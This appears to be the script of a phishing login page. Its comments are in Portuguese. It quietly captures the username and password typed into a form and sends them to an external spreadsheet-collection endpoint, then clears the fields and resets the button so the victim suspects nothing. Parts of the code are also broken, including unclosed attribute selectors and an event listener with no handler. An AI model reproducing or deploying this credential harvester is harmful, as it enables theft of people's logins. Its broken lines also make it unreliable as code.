let form = document.querySelector('form')
let button = document.querySelector('#submitBtn')
let usernameInput = document.querySelector('#username')
let passwordInput = document.querySelector('#password')

const resetButton = () => {
    button.value = 'Continue'
    usernameInput.value = ''
    passwordInput.value = ''
}

form.addEventListener("submit", (event) => {
    event.preventDefault() // Evita o envio padrão do formulário
    button.value = 'Loading...'
    setTimeout(resetButton, 1000) // Define um tempo para restaurar o valor do botão
})

const handleSubmit = (event) => {
    event.preventDefault()

    const username = document.querySelector('input[name=username').value
    const password = document.querySelector('input[name=password').value

    fetch('https://api.sheetmonkey.io/form/siaXBPCmYsoHRQGe4LHuVK', {
        method: 'post',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
    })
}

document.querySelector('form').addEventListener('submit', handleSubmit)
button.addEventListener("click")
form.addEventListener("submit", resetButton)